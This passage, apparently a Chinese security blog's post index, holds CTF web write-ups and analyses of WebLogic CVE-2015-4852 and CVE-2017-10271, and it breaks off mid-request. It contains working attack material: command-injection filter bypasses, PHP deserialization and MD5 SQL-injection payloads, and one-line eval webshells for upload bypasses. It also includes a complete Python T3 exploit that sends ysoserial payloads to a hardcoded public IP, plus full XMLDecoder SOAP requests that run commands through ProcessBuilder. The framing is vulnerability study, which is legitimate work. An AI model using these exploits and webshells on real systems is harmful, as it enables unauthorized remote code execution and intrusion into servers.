时，却没有回显了\n\n换一种思路，重新回到界面，尝试命令执行攻击\n\n\n命令执行方式攻击看到 ?ip= 很容易想到命令执行注入，使用 ; 或者 | 闭合上一条命令\n初步的 payload\n&#x2F;?ip&#x3D;;ls\n\n\n\n看到了 flag.php 的文件，直接 cat 应该就可以了吧？\n尝试 payload\n&#x2F;?ip&#x3D;;cat flag.php\n\n得到的回显还是 /?ip= fxck your space!，说明空格很可能是被过滤了，不可以输入到 ip 参数当中。\n空格被过滤时使用 $IFS$9 绕过。\npayload 构造如下\n&#x2F;?ip&#x3D;;cat$IFS$9flag.php\n\n\n\n还是报错，说明关键字 flag 被过滤\n尝试可不可以将此文件夹下的所有文件都 ls 出来，构造 payload\n&#x2F;?ip&#x3D;;cat$IFS$9&#96;ls&#96;\n\n只获取到了 index.php 的内容，看到一系列的过滤规则。\n\n\n\n静下心来，代码审计，实际上就是简单的进行了过滤。\n\n尝试绕过，先将 flag 中的 g 赋值给 变量 a，那么 flag 就变成了 fla$a，payload\n&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php\n\n终于出来了，累 QAQ\n\n\n\n\nHCTF 2018 admin打开网站，主界面如下图，在”hctf”有一处链接，好奇，点了进去，href是&#x2F;post\n&#x2F;post有点像博客的感觉？不知道，查看login和register。\n\n\n\n源码中有一段注释\n\n&lt;!-- you are not my admin --&gt;\n\n\n\n\n题目名为”admin”，尝试在register中注册admin，admin。提示\nThe username has been registered\n\n\n\n\n猜测应该是访问控制，提权类的题目，或许也可以用SQL注入(?)\n尝试了SQL注入，过不去，已知用户名为admin，对password进行爆破……没爆出来，抓包后也手足无措。尝试再注册一个账号吧，一直在外围进不去总不是什么办法。随意注册一个账号并登录。\n\n\n看一看界面，非常敏感地抓到了救命稻草，chang password，抓包。\n\n\n\n\n这里已经做好了通过remember_token和session替换的方式对admin进行密码修改，可是在登录的时候，发现输入admin，123(我之前设置的密码)，直接通过了…………虽然flag是拿到了，但是题目的原理还是没搞懂，深究一下。\n唔，原来是我眼瞎，没看到注释里面的GitHub\n\n\npython flask的解法不会，看了看Unicode欺骗，\n大致的思路是：在注册的时候”ADMIN”经过strlower()，转成”ADMIN”，在修改密码的时候”ADMIN”经过strlower()变成”admin”，当我们再次退出登录的时候”admin”经strlower()变成”admin”(没啥卵用，但是你已经知道了一个密码已的”admin”，而且在index.html中可以看到只要\nsession['name']=='admin'  也就是只要用户是'admin'就可成功登录了)\n这解法还真是出人意料\n极客大挑战 2019 Buy Flag简要点进去，发现有个 pay.php 的接口，感觉要做什么身份认证吧或许？扫一下目录看看。\n没扫出来，看到 pay.php 的 cookie 字段很特别，有一个 user&#x3D;0 的键值对，把它修改成 cuit 试了试，还是没用，然后在 response 请求中突然看到了源码。\n\n\n这里是若判断，所以构造一下 payload 吧，只需要 password 字段即可。\n修改 password 为 404，user 为 cuit 发包，没得到 flag，有点奇怪。加上 money 字段试一试\n还是没用，尝试将 user 改为 1，因为 0 代表 false，1 代表 true。\n也就是这样\n\n\n但是回显错了，可能是 100000000 这个数据太长了，猜测被 strcmp 了，用科学计数法简单绕过：10e10\n发包成功，得到 flag\n\n极客大挑战 2019 PHP\n应该是有泄露源码，尝试 &#x2F;www.zip\n\n这里吧，序列化反序列化，参数传 select\n\n\n再看 class.php 的文件\n\n\n这应该就是要我们构造序列化的东西，传进去，但是要跳过 __wakeup() 方法\n这里构造序列化的话是这个 \nO:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n\n在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup() 函数的执行\n因此我们将序列化这样设置\nO:4:\"Name\":3:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;&#125;\n\n不过还是没有结束，因为这个声明变量是private\nprivate 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度\n我们再次改造一下序列化\nO:4:\"Name\":3:&#123;s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;&#125;\n\n就可以了\n\nBJDCTF2020 Easy MD5不是很懂攻击点，单纯 password 不太能攻击吧，传参是 password，先扫一波看看。\n应该是没啥东西，看源码，发现了东西。\n\n\n这里挺难的，如果不知道的话，基本做不出来，\n上网找 payload 可以很轻松地找到 ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是\nselect * from 'admin' where password='' or '6xxxxx'\n\n\n\no 这里我想多了，直接会到这个接口\n\n\na，b md5 相同，但是值不能相同，如果队里有密码手估计不用多久吧。\nQNKCDZO\ns155964671a\n过了\n接着第三个，用数组绕\n\n\nMRCTF2020 你传你🐎呢\n典型的文件上传题目\n\n传 php 不行，传 jpeg 无法解析，加文件头不行，尝试 .htacess\n\n\n传 htacess 后传入一句话木马即可，我这里失败了，可能是容器的问题吧\nZJCTF 2019 NiZhuanSiWei源码如下\n&lt;?php    \n$text = $_GET[\"text\"];  \n$file = $_GET[\"file\"];  \n$password = $_GET[\"password\"];  \nif(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"))&#123;  \n    echo \"&lt;br>&lt;h1>\".file_get_contents($text,'r').\"&lt;/h1>&lt;/br>\";  \n    if(preg_match(\"/flag/\",$file))&#123;  \n        echo \"Not now!\";  \n        exit();   \n    &#125;else&#123;  \n        include($file);  //useless.php        $password = unserialize($password);  \n        echo $password;  \n    &#125;  \n&#125;  \nelse&#123;    highlight_file(__FILE__);  \n&#125;  \n?>\n\n绕过 text 这里的限制，因为要读取文件中的字符串，所以我们可以用这种方式绕过\n?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf\n\n后续需要通过 ?file 进行文件包含，再通过 password 进行反序列化，所以这一步我们应该是要去通过 ?file 参数读源码，payload 如下\nfile&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php\n\n如果直接读是读不到任何信息的，因为直接读只能读出一行\n\n\n转码之后得到源代码\n&lt;?php  \n\nclass Flag&#123;  //flag.php  \n    public $file;  \n    public function __tostring()&#123;  \n        if(isset($this->file))&#123;  \n            echo file_get_contents($this->file); \n            echo \"&lt;br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        &#125;  \n    &#125;  \n&#125;  \n?>  \n\n到这里就很简单了，编写 payload\n$a = new Flag();  \n$a->file = \"flag.php\";  \n$b = serialize($a);  \necho urlencode($b);\n\n按照道理来说打的 payload 应该是这样的\n&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome%20to%20the%20zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D\n\n但是这个 payload 实际情况打不通，实际打的过程中需要将 file=useless.php，可能是因为 file 的内容将后续部分给覆盖了\n\n\nSUCTF 2019 CheckIn简单的上传文件判断了一下，可以通过添加文件头 GIF89 bypass 所谓的文件后缀检测。当然里面还会匹配 &lt;?，一些简单的探测如图\n\n\n\n\n在上传成功了相当于做了一个 ls 的命令\n因为这里会去判断文件里面内容是否存在 &lt;?，感觉 PHP 的🐎都不太好上传，用到这种🐎\n&lt;script language='php'>eval($_POST['cmd'];&lt;/script>\n\n这里有点坑，其实自己想到了用 .user.ini 配合后面这个马打，但是我的 .user.ini 不完全对，应该是要这样\nauto_prepend_file=a.jpg\n\n这两个设置的区别只是在于 auto_prepend_file 是在文件前插入；**auto_append_file** 在文件最后插入（当文件调用的有exit()时该设置无效）\n但是后面还是没打通。。。好像是我自己的payload问题，最终打通了\nshell.jpeg\n&lt;script language='php'>@eval($_POST['shell']);&lt;/script>\n\n\nwatevrCTF-2019 Pickle Store\n做一个 Pickle 反序列化的题目，之前强网杯就碰到了，如果当时自己能够有这方面的知识储备，或许也能做出来，所以现在恶补一下。\n\n","categories":["CTF"],"tags":["CTF刷题"]},{"title":"CVE-2015-4852 WebLogic T3 反序列化分析","url":"/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/","content":"WebLogic T3 反序列化分析\n\nCVE-2015-4852 WebLogic T3 反序列化分析0x01 前言看到很多师傅的面经里面都有提到 Weblogic 这一个漏洞，最近正好有一些闲暇时间，可以看一看。\n因为环境上总是有一些小问题，所以会在本地和云服务器切换着调试\n0x02 环境搭建\n太坑了，我的建议是用本地搭建的方法，因为用 docker 搭建，会产生依赖包缺失的问题，本地搭建指南 https://www.penson.top/article/av40\n\n这里环境安装用的是 奇安信 A-team 大哥提供的脚本，不得不说实在是太方便了！省去了很多环境搭建中不必要的麻烦\n链接：https://github.com/QAX-A-Team/WeblogicEnvironment\n下载对应版本的 JDK 和 Weblogic 然后分别放在 jdks 和 weblogics 中\nJDK安装包下载地址：https://www.oracle.com/technetwork/java/javase/archive-139210.html\nWeblogic安装包下载地址：https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html\n我这里直接用的 kali 搭建，需要先把 jdk 和 weblogic 放到文件夹里面，如图\n\n\n\n\n首先要先改写一下 Dockerfile，原作者写的 Dockerfile 有一点小问题\n# 基础镜像\nFROM centos:centos7\n# 参数\nARG JDK_PKG\nARG WEBLOGIC_JAR\n# 解决libnsl包丢失的问题\n# RUN yum -y install libnsl\n\n# 创建用户\nRUN groupadd -g 1000 oinstall &amp;&amp; useradd -u 1100 -g oinstall oracle\n# 创建需要的文件夹和环境变量\nRUN mkdir -p /install &amp;&amp; mkdir -p /scripts\nENV JDK_PKG=$JDK_PKG\nENV WEBLOGIC_JAR=$WEBLOGIC_JAR\n\n# 复制脚本\nCOPY scripts/jdk_install.sh /scripts/jdk_install.sh \nCOPY scripts/jdk_bin_install.sh /scripts/jdk_bin_install.sh \n\nCOPY scripts/weblogic_install11g.sh /scripts/weblogic_install11g.sh\nCOPY scripts/weblogic_install12c.sh /scripts/weblogic_install12c.sh\nCOPY scripts/create_domain11g.sh /scripts/create_domain11g.sh\nCOPY scripts/create_domain12c.sh /scripts/create_domain12c.sh\nCOPY scripts/open_debug_mode.sh /scripts/open_debug_mode.sh\nCOPY jdks/$JDK_PKG .\nCOPY weblogics/$WEBLOGIC_JAR .\n\n# 判断jdk是包（bin/tar.gz）weblogic包（11g/12c）载入对应脚本\nRUN if [ $JDK_PKG == *.bin ] ; then echo ****载入JDK bin安装脚本**** &amp;&amp; cp /scripts/jdk_bin_install.sh /scripts/jdk_install.sh ; else echo ****载入JDK tar.gz安装脚本**** ; fi\nRUN if [ $WEBLOGIC_JAR == *1036* ] ; then echo ****载入11g安装脚本**** &amp;&amp; cp /scripts/weblogic_install11g.sh /scripts/weblogic_install.sh &amp;&amp; cp /scripts/create_domain11g.sh /scripts/create_domain.sh ; else echo ****载入12c安装脚本**** &amp;&amp; cp /scripts/weblogic_install12c.sh /scripts/weblogic_install.sh &amp;&amp; cp /scripts/create_domain12c.sh /scripts/create_domain.sh  ; fi\n\n# 脚本设置权限及运行\nRUN chmod +x /scripts/jdk_install.sh\nRUN chmod +x /scripts/weblogic_install.sh\nRUN chmod +x /scripts/create_domain.sh\nRUN chmod +x /scripts/open_debug_mode.sh\n# 安装JDK\nRUN /scripts/jdk_install.sh\n# 安装weblogic\nRUN /scripts/weblogic_install.sh\n# 创建Weblogic Domain\nRUN /scripts/create_domain.sh\n# 打开Debug模式\nRUN /scripts/open_debug_mode.sh\n# 启动 Weblogic Server\n# CMD [\"tail\",\"-f\",\"/dev/null\"]\nCMD [\"/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh\"]\nEXPOSE 7001\n\n接着起环境\ndocker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .\n\ndocker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21\n\n再把 docker 当中的一些依赖文件夹拷出来，但是这一步经过我测试，感觉 docker 当中的 lib 存在一定问题，所以后续把 weblogic 的库拿进来就可以了，对应的代码我会放在 GitHub 上，避免师傅们踩坑。\n0x03 基础知识关于 Weblogic\n首先说一说 Weblogic 吧，Weblogic 就和 Tomcat 差不多，从功能上来说就是两个 Web 服务端，也是启动器。\n\n和 Tomcat 不同的地方在于，Weblogic 可以自己部署很多东西，要知道，在 Tomcat 当中，这些都是需要自己写代码的。\nT3 协议T3 协议其实是 Weblogic 内独有的一个协议，在 Weblogic 中对 RMI 传输就是使用的 T3 协议。在 RMI 传输当中，被传输的是一串序列化的数据，在这串数据被接收后，执行反序列化的操作。\n在 T3 的这个协议里面包含请求包头和请求的主体这两部分内容。\n我们可以拿 CVE-2015-4852 的 EXP 来讲解\nEXP 如下\nimport socket\nimport sys\nimport struct\nimport re\nimport subprocess\nimport binascii\n\ndef get_payload1(gadget, command):\n    JAR_FILE = '.\\ysoserial.jar'\n    popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)\n    return popen.stdout.read()\n\ndef get_payload2(path):\n    with open(path, \"rb\") as f:\n        return f.read()\n\ndef exp(host, port, payload):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((host, port))\n\n    handshake = \"t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\".encode()\n    sock.sendall(handshake)\n    data = sock.recv(1024)\n    pattern = re.compile(r\"HELO:(.*).false\")\n    version = re.findall(pattern, data.decode())\n    if len(version) == 0:\n        print(\"Not Weblogic\")\n        return\n\n    print(\"Weblogic &#123;&#125;\".format(version[0]))\n    data_len = binascii.a2b_hex(b\"00000000\") #数据包长度，先占位，后面会根据实际情况重新\n    t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") #t3协议头\n    flag = binascii.a2b_hex(b\"fe010000\") #反序列化数据标志\n    payload = data_len + t3header + flag + payload\n    payload = struct.pack('>I', len(payload)) + payload[4:] #重新计算数据包长度\n    sock.send(payload)\n\nif __name__ == \"__main__\":\n    host = \"81.68.120.14\"\n    port = 7001\n    gadget = \"Jdk7u21\" #CommonsCollections1 Jdk7u21\n    command = \"Calc\"\n\n    payload = get_payload1(gadget, command)\n    exp(host, port, payload)\n\n\n这里有一个小坑，我直接运行 py 程序是不行的，会回显 Not Weblogic，因为 python socket 如果是频繁发包，会被服务端所拒绝，所以需要以 debug 模式运行。当然如果增添 sleep 应该也是可以实现的。\n\nWeblogic 请求包头我们需要通过 Wireshark 对这一个流量包执行抓包操作，后续抓到包的请求头如图\n\n\n这一个就是它请求包的头\nt3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001\n\n在发送该请求包头后，服务端 Weblogic 会有一个响应，内容如下\nHELO:10.3.6.0.false\nAS:2048\nHL:19\n\nHELO 后面的内容则是被攻击方的 Weblogic 版本号，也就是说，在发送正确的请求包头后，服务端会进行一个返回 Weblogic 的版本号。\nWeblogic 请求主体请求主体，也就是发送的数据，这些数据分为七部分内容，此处借用 z_zz_zzz师傅的修复weblogic的JAVA反序列化漏洞的多种方法文章中的一张图\n\n\n第一个非 Java 序列化数据，也就是我们的请求头：t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001\n后面第 n 部分的数据，其实是不限制的，也就是说，我可以只有一部分的 Java 序列化数据，也可以有七部分的 Java 序列化数据，这并不重要，我们可以看观察一下 Wireshark 抓的包\n\n\n在 ac ed 00 05 之后的内容便是序列化的数据，所以如果我们要进行攻击，应该是对于这一串序列化的数据进行恶意构造，让服务端在反序列化的时候发起攻击。\n\n而此处，如果有多个 Java 序列化的数据，可以对任一一个数据进行攻击即可。\n\n\n\n0x04 漏洞分析与调试影响版本Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3。\n寻找尾部漏洞点毕竟是反序列化的漏洞，思考了一下从两个点入手。\n1、是否存在 Jndi 注入2、是否有能够命令执行的利用点\nJndi 注入的链尾探索怀着这样的思路，先全局搜索 Jndi 关键词，感觉我这样的做法应该很不精准，但是暂时找不到其他好的方法，应该是要借助一些插件或者工具什么的了。\n\n\n这里有一个 JndiServiceImpl 类，看着不错，点进去看看，它的 invoke() 方法同样吸引人，点过去之后发现疑似存在 jndi 注入\n\n\n不过这里虽然参数 ———— this.implJndiName 是可控的，但是无法进行攻击，因为只能对 java:comp/env/ 进行探测，无法对 rmi, jndi, ldap 三者进行有效的调用，初步告吹了。\n重新换一个类，这里我找到的是 JndiAttrs 类，在它的构造函数中存在调用 ldap 的现象，在第 40 行\n\n\n从第六个字符开始截取，存在一些绕过手法，这个并不要紧，而 providerURL 最后会被 put 进 env 当中，env 是一个 Properties 类\n\n\n继续往下分析，env 作为 InitialDirContext 类的构造函数的传参。\n\n\n一路跟进，是到了 InitialContext 的构造函数，跟进 init() 方法\n\n\n跟进 getDefaultInitCtx() 方法，再跟进 NamingManager.getInitialContext(myProps)，发现只是 loadClass 了一个对象，寄，白给。\n\n\n\n\n\n诸如此类链尾的尝试还有很多，师傅们可以自行尝试，我这只是在抛砖引玉。由于篇幅限制，后续内容我们还是集中于 Weblogic CVE-2015-4852 的漏洞分析。\n\n漏洞分析通过命令 ls -r ./* | grep -i commons，抑或是通过 maven dependency analyze，都可以分析得到 weblogic 10.3.6 的包里面包含有 Commons Collections 3.2.0 的包。\n\n\n所以我们现在已经有了链尾，需要寻找一个合适的入口类，这里就直接借用其他师傅们的研究成果了，反序列化的入口类是在 InboundMsgAbbrev#readObject 处，下个断点开始调试。\n\nWeblogic T3 对于 RMI 传递过来的数据在处理上还是比较绕的，不过有了前面 z_zz_zzz 师傅文章中的那张图，在理解上能够变得简单得多。\n\n\n开始调试\n\n\n\n先跟进 ServerChannelInputStream 的构造函数，ServerChannelInputStream 这个类的作用是处理服务端收到的请求头信息\n\n\n继续跟进 getServerChannel() 方法\n\n\n我们可以关注一下目前的 this.connection 是什么\nconnection 是 weblogic.rjvm.t3.MuxableSocketT3$T3MsgAbbrevJVMConnection@49be5302 这个类，在 this.connection 中主要存储了一些 RMI 连接的数据，包括端口地址等\n\n\n跟进 getChannel() 方法，开始处理 T3 协议\n\n\n\n\n\nT3 头处理结束，重新回到 InboundMsgAbbrev#readObject 处，跟进 readObject() 方法\n\n一路跟进至 InboundMsgAbbrev#resolveClass() 中，这里的调用栈如下\nresolveClass:108, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)\nreadNonProxyDesc:1610, ObjectInputStream (java.io)\nreadClassDesc:1515, ObjectInputStream (java.io)\nreadOrdinaryObject:1769, ObjectInputStream (java.io)\nreadObject0:1348, ObjectInputStream (java.io)\nreadObject:370, ObjectInputStream (java.io)\nreadObject:66, InboundMsgAbbrev (weblogic.rjvm)\nread:38, InboundMsgAbbrev (weblogic.rjvm)\n\nresolveClass() 方法是用来处理类的，这些类在经过反序列化之后会走到 resolveClass() 方法这里，此时的 var1，正是我们的 AnnotationInvocationHandler 类\n\n\n这时候的 AnnotationInvocationHandler 类并不会被直接拿去反序列化，因为 Weblogic 服务端需要先加载所有反序列化的内容。在将所有数据反序列化解析完毕之后（也可以说只是做了 Class.forName() 的操作之后），才会开始进行真正的反序列化\n\n\n后续就是熟悉的 CC1 链环节，这里不再展开\n\n\nPoC 理解PoC 本质就是把 ysoserial 生成的 payload 变成 T3 协议里的数据格式，我们需要写入的有几段东西。\n1、Header，这代表了数据包长度2、T3 Header3、反序列化标志，也就是 fe 01 00 00\n所以这三段话是这么来的\nheader = binascii.a2b_hex(b\"00000000\")\nt3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\")\ndesflag = binascii.a2b_hex(b\"fe010000\")\n\n\n\n0x05 漏洞修复在 resolveClass 处打补丁在前面分析的过程中，我们能够看出来，加载类其实是通过调用 resolveClass() 方法，再通过反射获取到任意类的，所以官方选择了基于 resolveClass() 去做黑名单校验。\n如果在 resolveClass() 处加入一个过滤，在 readNonProxyDesc 调用完 resolveClass 方法后，后面的反序列化操作无法完成。\n通过 Web 代理与 nginx 等负载均衡防御Web 代理的方式只能转发 HTTP 的请求，而不会转发 T3 协议的请求，这就能防御住 T3 漏洞的攻击。当然这对于业务上有很大的影响。同理负载均衡也是，不过负载均衡需要自己手动设置。\n黑名单 bypassOracle 官方对于 CVE-2015-4852 的修复是通过黑名单限制的。\n\n\n黑名单中的类不会被反序列化\n绕过思路如下\n\n\n其实就是由 ServerChannelInputStream 换到了自身的 ReadExternal#InputStream，这一个 bypass 也被收录为 CVE-2016-0638；后续会对这一个漏洞进行分析。\n0x06 小结从原理角度上来说还是比较简单的，不过理解 T3 的传输，并且构造恶意 PoC 的过程是非常值得学习的，CVE-2015-4852 为一些类似的攻击提供了思路。\n0x07 Refhttps://www.anquanke.com/post/id/226070https://xz.aliyun.com/t/10563\n","categories":["漏洞复现"],"tags":["漏洞复现","Java","WebLogic"]},{"title":"CVE-2017-10271 WebLogic XMLDecoder","url":"/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/","content":"CVE-2017-10271 WebLogic XMLDecoder\n\n0x01 前言复现一下 Weblogic XMLDecoder 的漏洞，值得一提的是，还有一个 CVE-2017-3506 也是 XMLDecoder 反序列化的漏洞，而 CVE-2017-10271 是通过 void 、new 标签对 CVE-2017-3506 补丁的绕过。\n这篇文章的分析还是侧重点在 CVE-2017-10271\n0x02 环境搭建环境搭建与之前 Weblogic 漏洞的搭建一样，从本地搭建，用的版本是 jdk7u21 + weblogic 10.3.6，教程如下，不再造轮子了。\nhttps://www.penson.top/article/av40#toc-heading-1\n0x03 漏洞分析与复现简单的 XMLEncoder 和 XMLDecoderXMLDecoder&#x2F;XMLEncoder 是在JDK1.4版中添加的 XML 格式序列化持久性方案，使用 XMLEncoder 来生成表示 JavaBeans 组件(bean)的 XML 文档，用 XMLDecoder 读取使用 XMLEncoder 创建的 XML 文档获取 JavaBeans。\n\n一些简单的 example 如下\n\nXMLEncoderimport javax.swing.*;  \nimport java.beans.XMLEncoder;  \nimport java.io.BufferedOutputStream;  \nimport java.io.FileNotFoundException;  \nimport java.io.FileOutputStream;  \n  \npublic class EncoderExample &#123;  \n    public static void main(String[] args) throws FileNotFoundException &#123;  \n        FileOutputStream file = new FileOutputStream(\"result.xml\");  \n        XMLEncoder xmlEncoder = new XMLEncoder(new BufferedOutputStream(file));  \n        xmlEncoder.writeObject(new JButton(\"Hello,xml\"));  \n        xmlEncoder.close();  \n    &#125;  \n&#125;\n\n序列化了 JButton 类，得到的 XML 文档如下\n\n\nXMLDecoder代码 example 如下\nimport java.beans.XMLDecoder;  \nimport java.io.BufferedInputStream;  \nimport java.io.FileInputStream;  \n  \npublic class DecoderExample &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        FileInputStream file = new FileInputStream(\"result.xml\");  \n        XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file));  \n        Object o = xmlDecoder.readObject();  \n        System.out.println(o);  \n        xmlDecoder.close();  \n    &#125;  \n&#125;\n\n使用 XMLDecoder 读取序列化的 XML 文档，获取 JButton 类并打印，输出如下\njavax.swing.JButton[,0,0,0x0,invalid,alignmentX&#x3D;0.0,alignmentY&#x3D;0.5,border&#x3D;javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@7cd84586,flags&#x3D;296,maximumSize&#x3D;,minimumSize&#x3D;,preferredSize&#x3D;,defaultIcon&#x3D;,disabledIcon&#x3D;,disabledSelectedIcon&#x3D;,margin&#x3D;javax.swing.plaf.InsetsUIResource[top&#x3D;2,left&#x3D;14,bottom&#x3D;2,right&#x3D;14],paintBorder&#x3D;true,paintFocus&#x3D;true,pressedIcon&#x3D;,rolloverEnabled&#x3D;true,rolloverIcon&#x3D;,rolloverSelectedIcon&#x3D;,selectedIcon&#x3D;,text&#x3D;Hello,xml,defaultCapable&#x3D;true]\n\nXML 基础属性string 标签hello,xml 字符串的表示方式为 &lt;string&gt;Hello,xml&lt;/string&gt;\nobject 标签通过 &lt;object&gt; 标签表示对象， class 属性指定具体类(用于调用其内部方法)，method 属性指定具体方法名称(比如构造函数的的方法名为 new )\nnew JButton(&quot;Hello,xml&quot;) 对应的 XML 文档：\n&lt;object class=\"javax.swing.JButton\" method=\"new\">\n    &lt;string>Hello,xml&lt;/string>\n&lt;/object>\n\nvoid 标签通过 void 标签表示函数调用、赋值等操作， method 属性指定具体的方法名称。\nJButton b = new JButton();b.setText(&quot;Hello, world&quot;); 对应的 XML 文档：\n&lt;object class=\"javax.swing.JButton\">\n    &lt;void method=\"setText\">\n    &lt;string>Hello,xml&lt;/string>\n    &lt;/void>\n&lt;/object>\n\narray标签通过 array 标签表示数组， class 属性指定具体类，内部 void 标签的 index 属性表示根据指定数组索引赋值。String[] s = new String[3];s[1] = &quot;Hello,xml&quot;; 对应的 XML 文档：\n漏洞影响版本WebLogic 存在 WLS-WebServices 的组件皆会受到影响\n漏洞原理WebLogic 的 WLS Security 组件对外提供 WebService 服务，其中使用 XMLDecoder 来解析 XML 格式数据，其存在反序列化漏洞，从而导致 RCE。\n\n下面来看一个解析 xml 导致反序列化命令执行的 demo：\n\nimport java.beans.XMLDecoder;  \nimport java.io.BufferedInputStream;  \nimport java.io.FileInputStream;  \n  \n// XML 反序列化漏洞的 Demopublic class XMLDecoderEvilDemo &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        FileInputStream file = new FileInputStream(\"F://poc.xml\");  \n        XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file));  \n        Object result = xmlDecoder.readObject();  \n        xmlDecoder.close();  \n    &#125;  \n&#125;\n\n对应的 poc.xml 如下\n&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n    &lt;void class=\"java.lang.ProcessBuilder\">\n        &lt;array class=\"java.lang.String\" length=\"1\">\n            &lt;void index=\"0\">\n                &lt;string>Calc&lt;/string>\n            &lt;/void>\n        &lt;/array>\n        &lt;void method=\"start\"/>&lt;/void>\n&lt;/java>\n\n\n\n使用 java.lang.ProcessBuilder 进行代码执行，整个恶意 XML 反序列化后相当于执行代码：\nString[] cmd = new String[1];\ncmd[0] = \"Calc\";\nnew ProcessBuilder(cmd).start();\n\n漏洞复现与分析漏洞复现Weblogic 本质上是 Web Service 服务，报文内容类型是 SOAP 型 WebService 报文,所以 /wls-wsat/CoordinatorPortType 接口可以接收 XML 数据的请求包\n构造恶意 XML 文件，和之前的一样\n&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n    &lt;void class=\"java.lang.ProcessBuilder\">\n        &lt;array class=\"java.lang.String\" length=\"1\">\n            &lt;void index=\"0\">\n                &lt;string>Calc&lt;/string>\n            &lt;/void>\n        &lt;/array>\n        &lt;void method=\"start\"/>&lt;/void>\n&lt;/java>\n\nPOST 包整体如下\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: 127.0.0.1:7001\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: text/xml\nContent-Length: 482\n\n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> &lt;soapenv:Header>\n&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n&lt;void class=\"java.lang.ProcessBuilder\">\n&lt;array class=\"java.lang.String\" length=\"1\">\n&lt;void index=\"0\">\n&lt;string>Calc&lt;/string>\n&lt;/void>\n&lt;/array>\n&lt;void method=\"start\"/>&lt;/void>\n&lt;/java>\n&lt;/work:WorkContext>\n&lt;/soapenv:Header>\n&lt;soapenv:Body/>\n&lt;/soapenv:Envelope>\n\n\n\n如果是要弹 shell，或者执行 ping 命令探测，POST 请求包如下\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1  \nHost: your-ip:7001  \nAccept-Encoding: gzip, deflate  \nAccept: */*  \nAccept-Language: en  \nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  \nConnection: close  \nContent-Type: text/xml  \nContent-Length: 633  \n  \n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> &lt;soapenv:Header>  \n&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">  \n&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">  \n&lt;void class=\"java.lang.ProcessBuilder\">  \n&lt;array class=\"java.lang.String\" length=\"3\">  \n&lt;void index=\"0\">  \n&lt;string>/bin/bash&lt;/string>  \n&lt;/void>  \n&lt;void index=\"1\">  \n&lt;string>-c&lt;/string>  \n&lt;/void>  \n&lt;void index=\"2\">  \n&lt;string>ping 